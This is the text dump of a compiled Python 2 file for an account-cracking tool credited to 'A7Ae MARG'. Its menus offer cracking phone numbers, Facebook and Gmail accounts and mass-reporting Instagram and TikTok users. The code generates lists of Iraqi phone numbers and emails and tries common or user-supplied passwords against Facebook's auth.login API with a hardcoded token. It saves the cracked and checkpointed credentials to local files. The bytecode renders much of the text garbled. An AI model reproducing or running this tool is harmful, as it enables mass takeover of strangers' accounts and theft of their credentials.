ó
 ÿc           @   s  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z e j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÍ We j d	  xJ e d
  D]< Z e j d d  Z e d d  e _ e GHe j j   q'Wy d d l Z Wn e k
 re j d  n Xy d d l Z Wn e k
 rÈe j d  n Xy d d l Z Wn8 e k
 re j d  e j d  e j d  n Xd d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z e  e  e j! d  e j   Z" e" j# e   e" j$ e j% j&   d d d4 g e" _' d5 g e" _' d6 g e" _' d7 g e" _' d8 g e" _' d9 g e" _' d: g e" _' d    Z( d!   Z) d"   Z* d#   Z+ d$   Z, d%   Z- d& Z. d  Z/ g  Z0 g  Z1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 d'   Z7 d(   Z8 d)   Z9 d*   Z: d+   Z; d,   Z< d-   Z= d.   Z> d/   Z? d0   Z@ eA d1 k r{e j d2  e. GHe j d3  e@   n  d S(;   i    iÿÿÿÿNs   rm -rf .txtip  iGô i s   .txtt   as   rm -rf ..txti  i   iç  s   ..txts   pip2 install tqdms   pip2 install requestss   pip2 install mechanizei   s   python2 MARG.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-Agents   Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1s   Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.187 Mobile Safari/534.11+s   Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4s   Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1s   Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobiles   Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362s2   Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   583906052o.pyt   mengetik6   s    c           C   s   d GHt  j j   d  S(   Nt   Keluar(   t   osR   t   exit(    (    (    s   583906052o.pyt   keluar=   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   583906052o.pyt   acakB   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R   (   R   R   R   t   jR   (    (    s   583906052o.pyR   K   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gü©ñÒMbP?(   R   R   R   R	   R
   R   (   R   R   (    (    s   583906052o.pyt   jalanV   s    c          C   sY   t  d d d d d d  8 }  x. t d  D]  } t j d  |  j d  q+ WWd  QXd  S(	   Nt   totalid   t   descs   Loading t
   bar_formats   {l_bar}{bar}g¸ëQ¸?i   (   t   tqdmt   rangeR
   R   t   update(   t   pbarR   (    (    s   583906052o.pyt   load^   s    s}   
[1;97m88888888ba   88b           d88  I8,        8        ,8I  
[1;97m88      "8b  888b         d888  `8b       d8b       d8'  
[1;97m88      ,8P  88`8b       d8'88   "8,     ,8"8,     ,8"   
[1;97m88aaaaaa8P'  88 `8b     d8' 88    Y8     8P Y8     8P    
[1;97m88aaaaaaP    88  `8b   d8'  88    `8b   d8' `8b   d8'    
[1;97m88      `8b  88   `8b d8'   88     `8a a8'   `8a a8'     
[1;97m88      a8P  88    `888'    88      `8a8'     `8a8'      
[1;97m88888888P"   88     `8'     88       `8'       `8'       

[1;97mCreated By A7Ae MARG !!

[1;97mMy Telegram : [1;97m@A7Ae_MARG

[1;97mMy Chanell  : [1;97m@A7AeMARG
    c           C   sE   t  j d  t GHd GHd GHd GHd GHd GHd GHd GHd GHt   d  S(	   Nt   clears;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~s-   [1;97m[[1;97m1[1;97m][1;92m CRACK NUMBERSs.   [1;97m[[1;97m2[1;97m][1;92m CRACK FACEBOOKs0   [1;97m[[1;97m3[1;97m][1;92m REPORT INSTAGRAMs-   [1;97m[[1;97m4[1;97m][1;92m REPORT TIKTOKs,   [1;97m[[1;97m5[1;97m][1;92m CRACK  gmails1   [1;97m[[1;97m0[1;97m][1;91m Exit this program(   R   t   systemt   logot
   pilih_menu(    (    (    s   583906052o.pyt   menu}   s    c          C   s  t  d  }  |  d k r' d GHt   nê |  d k s? |  d k rI t   nÈ |  d k sa |  d k rq t j d  n  |  d k s |  d k r t j d  nx |  d	 k s± |  d	 k rÁ t j d
  nP |  d k sÙ |  d k rã t   n. |  d k sû |  d k rt   n d GHt   d  S(   Ns@   [1;97m[[97mâ¢[1;97m] [1;97m( [1;97mChoose[1;97m ) > [97mR   s-   [1;97m[[1;97m![1;97m][1;97m Wrong input !t   1t   2s   python2 hcrack.pyt   3s   python INSTAGRAM.pyt   4s   python TIKTOK.pyt   5t   0s'   [1;97m[[1;97mÃ·[1;97m] Wrong input !(   t	   raw_inputR0   t   crack_nomorR   R.   t   crack_emailR   (   t   unikers(    (    s   583906052o.pyR0      s$    



c           C   s;   t  j d  t GHd GHd GHd GHd GHd GHd GHt   d  S(   NR-   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~s7   [1;97m[[1;97m1[1;97m][1;92m CRACK NUMBERS KURDSTAN s7   [1;97m[[1;97m2[1;97m][1;92m CRACK NUMBERS PASWORDS s9   [1;97m[[1;97m3[1;97m][1;92m CRACK NUMBERS Free Mod   s6   [1;97m[[1;71m0[1;97m][1;92m Back To Menu          (   R   R.   R/   t   pilih(    (    (    s   583906052o.pyR9   ¡   s    c          C   sá   t  d  }  |  d k r' d GHt   n¶ |  d k s? |  d k rI t   n |  d k sa |  d k rk t   nr |  d k s |  d k r t   nP |  d k s¥ |  d k r¯ t   n. |  d k sÇ |  d k rÑ t   n d	 GHt   d  S(
   NsB   [1;97m[[97mâ¢[1;97m] [1;97m( [1;97mChoose[1;97m ) > [1;97mR   s-   [1;97m[[1;97mx[1;97m][1;97m Wrong input !R2   R3   R4   R5   R7   s'   [1;97m[[1;97mÃ·[1;97m] Wrong input !(   R8   R<   t   indiat   nguyent   a7aR:   R1   (   R;   (    (    s   583906052o.pyR<   ­   s     





c             sÛ  t  j d  t GHd GHd GHd GHd GHd d GHyq t d    t    d	 k  r\ t d
  n d d  d }  x0 t |  d  j   D] } t j	 | j
    q WWn' t k
 rÉ d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  q$Wd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d   t  j d!  d  S("   NR-   s   [1;97m+964s   [1;97m0750-0751s   [1;97m0780-0781-0782-0783s   [1;97m0777-0770-0771-0772-0773i2   s   [1;97m~s@   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97mi   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   .txtt   rs   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;92m[[1;92m![1;92m] [1;92mDon't closes   .   s   ..  s   ... s1   [1;92m[[1;92mâ¢[1;92m][1;92m Crack Running i   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~c            sm	  |  } y t  j d  Wn t k
 r* n Xy4	| } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k rTd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n
d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n[d | d k rzd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  näd } t j d    | d | d  } t j |  } d | k r)d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n5d | d k r d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n¾d }	 t j d    | d |	 d  } t j |  } d | k rOd    | d |	 GHt d d	  } | j    | |	 d
  | j   t	 j
   | |	  nd | d k rÆd    | d |	 GHt d d	  } | j    | |	 d
  | j   t j
   | |	  nd }
 t j d    | d |
 d  } t j |  } d | k rud    | d |
 GHt d d	  } | j    | |
 d
  | j   t	 j
   | |
  néd | d k rìd    | d |
 GHt d d	  } | j    | |
 d
  | j   t j
   | |
  nrd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nÃd | d k rd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nLd } t j d    | d | d  } t j |  } d | k rÁd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k r8d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n&d } t j d    | d | d  } t j |  } d | k rçd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nw d | d k r^	d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   anggaxd/clone.txtR    s   
s   www.facebook.comt	   error_msgs#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m t
   1122334455t   112233445566t   112233112233t
   1234512345t
   1234554321t   123321t	   123456789(   R   t   mkdirt   OSErrort   brt   opent   jsonR,   R   t   closet   okst   appendt   cpb(   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8(   t   ct   k(    s   583906052o.pyt   mainã   s    '

'

'

'

'

'

'

'

i   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msA   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/kurd.txts   [1;97m[[1;97m BACK [1;97m]s   python2 MARG.py(   R   R.   R/   R8   R   R   RN   t	   readlinest   idRR   t   stript   IOErrorR1   R"   R$   R
   R   R   R   R	   R   t   mapRQ   t   cekpoint(   t   idlistt   linet   xxxt   titikt   oRd   t   p(    (   Rb   Rc   s   583906052o.pyR=   Á   sN    	"

)
c             sà  t  j d  t GHd GHd GHd GHd GHd GHd d GHyq t d	    t    d
 k  ra t d  n d d  d }  x0 t |  d  j   D] } t j	 | j
    q WWn' t k
 rÎ d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  q)Wd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd  GHd GHt d!  t  j d"  d  S(#   NR-   s   [1;97mCrack Number Free Mods   [1;97m+964s   [1;97m0750-0751s   [1;97m0780-0781-0782-0783s   [1;97m0777-0770-0771-0772-0773i2   s   [1;97m~s@   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97mi   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   .txtR@   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;92m[[1;92m![1;92m] [1;92mDon't closes   .   s   ..  s   ... s1   [1;92m[[1;92mâ¢[1;92m][1;92m Crack Running i   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~c            sm	  |  } y t  j d  Wn t k
 r* n Xy4	| } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k rTd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n
d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n[d | d k rzd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  näd } t j d    | d | d  } t j |  } d | k r)d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n5d | d k r d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n¾d }	 t j d    | d |	 d  } t j |  } d | k rOd    | d |	 GHt d d	  } | j    | |	 d
  | j   t	 j
   | |	  nd | d k rÆd    | d |	 GHt d d	  } | j    | |	 d
  | j   t j
   | |	  nd }
 t j d    | d |
 d  } t j |  } d | k rud    | d |
 GHt d d	  } | j    | |
 d
  | j   t	 j
   | |
  néd | d k rìd    | d |
 GHt d d	  } | j    | |
 d
  | j   t j
   | |
  nrd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nÃd | d k rd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nLd } t j d    | d | d  } t j |  } d | k rÁd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k r8d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n&d } t j d    | d | d  } t j |  } d | k rçd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nw d | d k r^	d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n  Wn n Xd  S(   NRA   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmRB   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   anggaxd/clone.txtR    s   
s   mbasic.facebook.comRC   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m RD   RE   RF   RG   RH   RI   RJ   (   R   RK   RL   RM   RN   RO   R,   R   RP   RQ   RR   RS   (   RT   RU   RV   RW   RX   RY   RZ   R[   R\   R]   R^   R_   R`   Ra   (   Rb   Rc   (    s   583906052o.pyRd     s    '

'

'

'

'

'

'

'

i   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msB   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/kurd1.txts   [1;97m[[1;97m BACK [1;97m]s   python2 MARG.py(   R   R.   R/   R8   R   R   RN   Re   Rf   RR   Rg   Rh   R1   R"   R$   R
   R   R   R   R	   R   Ri   RQ   Rj   (   Rk   Rl   Rm   Rn   Ro   Rd   Rp   (    (   Rb   Rc   s   583906052o.pyR?   x  sP    	"

)
c             s+  t  j d  t GHd GHd GHd GHd GHd d GHy² t d    t    d	 k  r\ t d
  n d d  d GHt d   t d   t d   t d   t d   d }  x0 t |  d  j   D] } t j	 | j
    qÃ WWn' t k
 r
d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qeWd GH        f d   } t d   } | j | t  d! GHd" GHd# t t t   d$ t t t   GHd% GHd! GHt d&  t  j d'  d  S((   NR-   s   [1;97m+964s   [1;97m0750-0751s   [1;97m0780-0781-0782-0783s   [1;97m0777-0770-0771-0772-0773i2   s   [1;97m~sA   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97m i   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   sB   [1;97m[[1;97mâ¢[1;97m] [1;97m Example : [1;91m ( A7Ae MARG) s+   [1;97m[[97mâ¢[1;97m] Password 1 : [97ms2   [1;97m[[97mâ¢[1;97m] [1;97mPassword 2 : [97ms+   [1;97m[[97mâ¢[1;97m] Password 3 : [97ms2   [1;97m[[97mâ¢[1;97m] [1;97mPassword 4 : [97ms+   [1;97m[[97mâ¢[1;97m] Password 5 : [97ms   .txtR@   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;97m[[1;97m![1;97m] [1;97mDon't Closes   .   s   ..  s   ... s1   [1;97m[[1;97mâ¢[1;97m][1;97m Crack Running i   s<   [1;97m
~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÌt j d    | d  d  } t j |  } d | k rÛ d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nd | d k rVd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n t j d    | d  d  } t j |  } d | k rd    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nód | d k r~d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nxt j d    | d  d  } t j |  } d | k r+d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nËd | d k r¦d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nPt j d    | d  d  } t j |  } d | k rSd    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n£d | d k rÎd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n(t j d    | d  d  } t j |  } d | k r{d    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n{ d | d k röd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n  Wn n Xd  S(   NRA   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RB   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   save/nguyen.txtR    s   [HACK] s    | s   
s   www.facebook.comRC   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m s   [Cekpoint] s   [CHECK] s   [CHECK]s   [HACK]s   [CHECK(   R   RK   RL   t   urllibt   urlopenRO   R,   RN   R   RP   RQ   RR   Rj   (   RT   RU   RW   R   RY   RZ   (   Rb   Rc   RV   R[   R\   R]   R^   (    s   583906052o.pyRd   W  s    '%
%
'%
%
'%
%
'%
%
'%
%
i   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack Done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msB   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/kurd3.txts   [1;97m[[1;97m BACK [1;97m]s   python2 MARG.py(   R   R.   R/   R8   R   R   RN   Re   Rf   RR   Rg   Rh   R1   R"   R$   R
   R   R   R   R	   R   Ri   RQ   Rj   (   Rk   Rl   Rm   Rn   Ro   Rd   Rp   (    (   Rb   Rc   RV   R[   R\   R]   R^   s   583906052o.pyR>   /  sZ    	"

!U)
c             sü  t  j d  t GHy  d GHt d    d GHt d   d GHt d   t d   t d	   t d
   t d   d }  x0 t |  d  j   D] } t j | j    q WWn' t	 k
 rÛ d GHt d  t
   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  q6Wd GH        f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d   d  S(!   NR-   sD   [1;97m[[1;97mâ¢[1;97m][1;97m Example[1;97m :[1;97m putri.ayu s>   [1;97m[[1;97mâ¢[1;97m][1;97m Nama Target[1;97m :[1;97m sF   [1;97m[[1;97mâ¢[1;97m][1;97m Example [1;97m: [1;97m@hotmail.coms?   [1;97m[[1;97mâ¢[1;97m][1;97m Domain Email[1;97m :[1;97m sB   [1;97m[[1;97mâ¢[1;97m][1;97m Example [1;97m: [1;97mPutri123s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password1[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password2[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password3[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password4[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password5[1;97m :[1;97m s   ..txtR@   s   [!] File Not Founds   
[ Kembali ]s>   [1;97m[[1;97mâ¢[1;97m][1;97m Total Email [1;97m:[1;97m i   s+   [1;97m[[1;97m![1;97m] [1;97mDon't Closes   .   s   ..  s   ... s1   [1;97m[[1;97mâ¢[1;97m][1;97m Crack Running s?   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÍt j d   |  d  d  } t j |  } d | k rÛ d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nd | d k rVd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n¡t j d   |  d  d  } t j |  } d | k rd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nôd | d k r~d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nyt j d   |  d  d  } t j |  } d | k r+d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nÌd | d k r¦d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nQt j d   |  d  d  } t j |  } d | k rSd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   n¤d | d k rÎd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n)t j d   |  d  d  } t j |  } d | k r{d   |  d  GHt d d	  } | j d   |  d  d  | j	   t
 j |   n| d | d k r÷d   |  d  GH| j d d	  | j d   |  d  d  | j	   t j |   n  Wn n Xd  S(   NRA   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RB   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   save/email.txtR    s   [Berhasil] s    | s   
s   www.facebook.comRC   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m s   [Cekpoint] s   [1;97m s
   [Berhasil]s
   [Cekpoint](   R   RK   RL   Rq   Rr   RO   R,   RN   R   RP   RQ   RR   Rj   (   RT   RU   RW   R   RY   RZ   (   Rb   Rc   RV   R[   R\   R]   R^   (    s   583906052o.pyRd   Û  s    '%
%
'%
%
'%
%
'%
%
'%
%
i   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack Done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msB   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/email.txts   [1;97m[[1;97m BACK [1;97m]s   python2 MARG.py(   R   R.   R/   R8   RN   Re   Rf   RR   Rg   Rh   R1   R"   R   R$   R
   R   R   R   R	   R   Ri   RQ   Rj   (   Rk   Rl   Rm   Rn   Ro   Rd   Rp   (    (   Rb   Rc   RV   R[   R\   R]   R^   s   583906052o.pyR:   ·  sR    

!U)
c          C   si   t  j d  }  t j |  j  } | d } t j d  t d d  } | j |  | j	   t
   d  S(   Ns   https://httpbin.org/uuidt   uuids$   touch /data/data/com.termux/beta.txts   /data/data/com.termux/beta.txtR   (   t   requestst   getRO   t   loadst   textR   R.   RN   R   RP   t   chk(   Rs   t   jsonidt   idjscrt   reb(    (    s   583906052o.pyt   idcr:  s    

c          C   sÊ   t  j d  }  d |  k r¿ t  j d  t d d  j   } d t |  GHt j d  j } | | k r d GHt	 j
 d	  t  j d
  t   qÆ t  j d
  d GHt	 j
 d	  t j   n t   d  S(   Ns   /data/data/com.termux/s   beta.txts(   chmod 777 /data/data/com.termux/beta.txts   /data/data/com.termux/beta.txtR@   s
   Your ID : s!   https://pastebin.com/raw/FWb1V8GHs   [1;92mYour ID is Active  .... i   s(   chmod 000 /data/data/com.termux/beta.txts!   [31;1mYour ID Isn't Active .....(   R   t   listdirR.   RN   t   readR"   Rt   Ru   Rw   R
   R   R1   R   R   R|   (   R   t   readidt
   textupload(    (    s   583906052o.pyRx   E  s     
t   __main__R-   i   (   s
   User-Agents   Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1(   s
   User-Agents   Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.187 Mobile Safari/534.11+(   s
   User-Agents   Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4(   s
   User-Agents   Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1(   s
   User-Agents   Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile(   s
   User-Agents   Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362(   s
   User-Agents2   Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)(B   t   Falset   foot   barR   R   R
   t   datetimeR   t   hashlibt   ret	   threadingRO   Rq   t	   cookielibt   getpassR.   R)   t   nR   t   nmbrRN   R   R	   Rt   t   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRM   t   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R$   R,   R/   t   backt   berhasilRj   RQ   RY   Rf   RS   RZ   R1   R0   R9   R<   R=   R?   R>   R:   R|   Rx   t   __name__(    (    (    s   583906052o.pyt   <module>   s   

												·	·				